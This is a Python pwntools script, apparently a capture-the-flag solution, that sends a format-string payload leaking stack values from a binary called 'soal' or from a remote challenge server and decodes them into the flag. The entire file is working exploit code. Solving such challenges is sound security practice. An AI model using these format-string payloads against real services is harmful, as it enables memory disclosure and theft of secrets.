#!/usr/bin/env python3
from pwn import *

LOCAL = "./soal"
REMOTE_HOST = "ctf-chall.stembascc.com"
REMOTE_PORT = 5201

PAYLOAD = b"%8$p.%9$p.%10$p.%11$p.%12$p.%13$p\n"


def parse_flag(leak):
    hex_values = leak.strip().split(".")
    flag = ""

    for h in hex_values:
        if h.startswith("0x"):
            raw = bytes.fromhex(h[2:])
            flag += raw[::-1].decode("ascii", errors="ignore")

    # closing brace karena format-string hilang byte terakhir
    if not flag.endswith("}"):
        flag += "}"

    return flag


def exploit_local():
    io = process(LOCAL)

    # baca "Input"
    io.recvline()

    io.sendline(PAYLOAD)

    leak = io.recvline(timeout=1).decode()
    print("[*] Raw leak:", leak)

    flag = parse_flag(leak)
    print("[+] FLAG:", flag)
    print("[+] Length:", len(flag))


def exploit_remote():
    io = remote(REMOTE_HOST, REMOTE_PORT)

    io.recvline()  # baca "Input"

    io.sendline(PAYLOAD)

    leak = io.recvline(timeout=2).decode()
    print("[*] Raw leak:", leak)

    flag = parse_flag(leak)
    print("[+] FLAG:", flag)
    print("[+] Length:", len(flag))


if __name__ == "__main__":
    mode = input("Mode? (local/remote): ").strip().lower()

    if mode == "local":
        exploit_local()
    else:
        exploit_remote()
